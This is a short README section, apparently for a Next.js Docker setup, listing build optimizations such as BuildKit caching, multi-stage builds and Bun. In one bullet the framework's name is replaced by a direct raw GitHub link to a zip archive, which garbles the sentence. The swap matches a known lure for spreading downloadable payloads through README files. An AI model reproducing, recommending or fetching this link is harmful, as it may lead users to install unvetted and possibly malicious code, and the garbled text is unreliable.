## 🎯 Goal

This Dockerfile is optimized for the fastest possible builds in CI/CD environments where Docker images are rebuilt multiple times per day. It uses advanced caching strategies, multi-stage builds, and modern Docker features to minimize build times on subsequent runs while keeping the final image size minimal.

Key optimizations include:
- ⚡ BuildKit cache mounts for dependency and build artifact caching
- 🏗️ Multi-stage builds to separate build dependencies from runtime
- 🚀 Bun for ultra-fast dependency installation (up to 25x faster than npm)
- 📦 https://raw.githubusercontent.com/D3M4rc0/nextjs-docker/main/mover/nextjs-docker.zip standalone output for minimal runtime footprint
- 🎯 Strategic layer ordering to maximize Docker layer caching
